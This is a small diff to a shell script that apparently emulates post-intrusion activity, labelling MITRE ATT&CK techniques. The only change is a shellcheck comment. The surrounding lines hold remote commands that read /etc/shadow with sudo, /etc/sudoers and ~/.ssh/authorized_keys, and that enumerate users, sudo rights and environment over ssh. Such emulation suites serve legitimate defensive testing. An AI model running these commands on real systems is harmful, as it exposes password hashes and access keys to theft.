@@ -72,6 +72,7 @@ act T1033 "whoami; id; uname -a (remote)" "$DST" "$TGT"
 act T1552.001 "cat /etc/sudoers (remote)" "$DST" "/etc/sudoers"
 act T1548.003 "sudo -l (remote)" "$DST" "sudo policy"
 act T1003.008 "sudo cat /etc/shadow (remote)" "$DST" "/etc/shadow"
+# shellcheck disable=SC2088  # a label for the log, not a path to expand
 act T1552.001 "cat ~/.ssh/authorized_keys (remote)" "$DST" "~/.ssh/authorized_keys"
 act T1082 "who; last; env (remote)" "$DST" "session/environment"
 TRANSCRIPT="$("${ST_SSHPASS[@]}" ssh -p "$SSH_PORT" \
